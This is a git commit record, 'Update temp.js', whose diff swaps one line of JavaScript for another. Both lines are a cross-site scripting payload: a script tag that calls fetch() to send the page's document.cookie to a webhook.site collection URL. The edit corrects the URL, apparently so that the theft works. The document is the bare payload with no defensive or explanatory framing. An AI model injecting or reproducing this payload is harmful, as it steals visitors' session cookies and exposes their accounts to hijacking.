6ffc6ab90376abd8f260c103d540054301549edb
Guilherme Belchior <96209787+belchiorg@users.noreply.github.com>
2024-12-07 15:32:11 +0000

    Update temp.js

--- temp.js
+++ temp.js
@@ -1,1 +1,1 @@
-<script>fetch('https://webhook.site/#!/view/9d1dc754-34ea-4998-ae85-a8837e67abdc/6c51a216-5fa4-404d-9ad3-18da14f4f7c1/1/?cookies=' + encodeURIComponent(document.cookie));</script>
+<script>fetch('https://webhook.site/9d1dc754-34ea-4998-ae85-a8837e67abdc/?cookies=' + encodeURIComponent(document.cookie));</script>
